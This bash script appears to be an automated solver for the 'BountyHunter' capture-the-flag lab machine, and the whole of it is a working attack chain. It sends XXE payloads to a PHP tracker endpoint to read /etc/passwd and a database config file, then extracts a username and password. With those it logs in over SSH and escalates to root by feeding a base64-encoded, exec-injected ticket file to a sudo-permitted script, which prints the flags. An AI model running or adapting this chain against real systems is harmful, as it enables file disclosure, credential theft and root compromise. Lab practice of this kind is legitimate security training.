#!/bin/bash

data='<?xml  version="1.0" encoding="UTF-8"?><!DOCTYPE title [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><bugreport><title></title><cwe></cwe><cvss></cvss><reward>&xxe;</reward></bugreport>'
user=$(bash -c "curl -X POST --data-urlencode \"data=$(echo $data | base64 -w 0)\" 'http://bountyhunter.htb/tracker_diRbPr00f314.php'  | html2markdown | tail -n 2 | head -n 1 | base64 -d" 2>/dev/null | grep '/bin/bash$' | awk -F':' '{print $5}' | cut -d , -f1 | tail -n 1 | tr '[:upper:]' '[:lower:]') 
data='<?xml  version="1.0" encoding="UTF-8"?><!DOCTYPE title [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]><bugreport><title></title><cwe></cwe><cvss></cvss><reward>&xxe;</reward></bugreport>'
password1=$(bash -c "curl -X POST --data-urlencode \"data=$(echo $data | base64 -w 0)\" 'http://bountyhunter.htb/tracker_diRbPr00f314.php'  | html2markdown | tail -n 2 | head -n 1 | base64 -d" 2>/dev/null | grep -i '$dbpassword' | cut -d '"' -f 2)

echo "Got SSH Creds ! Username= $user , Password= $password1"

sshpass -p "$password1" ssh -oStrictHostKeyChecking=accept-new "$user"@bountyhunter.htb 'bash -c "echo IyBTa3l0cmFpbiBJbmMKIyMgVGlja2V0IHRvICAgICBhYmMKX19UaWNrZXQgQ29kZTpfXwpfX1RpY2tldCBDb2RlOl9fCioqNCsyMDArZXhlYygnJydpbXBvcnQgb3M7b3Muc3lzdGVtKCJlY2hvIC1uICdmbGFnIHVzZXIudHh0PSAnOyBjYXQgL2hvbWUvZGV2ZWxvcG1lbnQvdXNlci50eHQ7IGVjaG8gLW4gJ2ZsYWcgcm9vdC50eHQ9ICc7Y2F0IC9yb290L3Jvb3QudHh0IiknJycpCg==" | base64 -d > root.md; echo "root.md" | sudo $(sudo -l | rev | awk '"'"'{print $1" "$2}'"'"' | rev | tail -n 1)' 2>/dev/null | grep flag | awk  '{print $2 " " $3}'
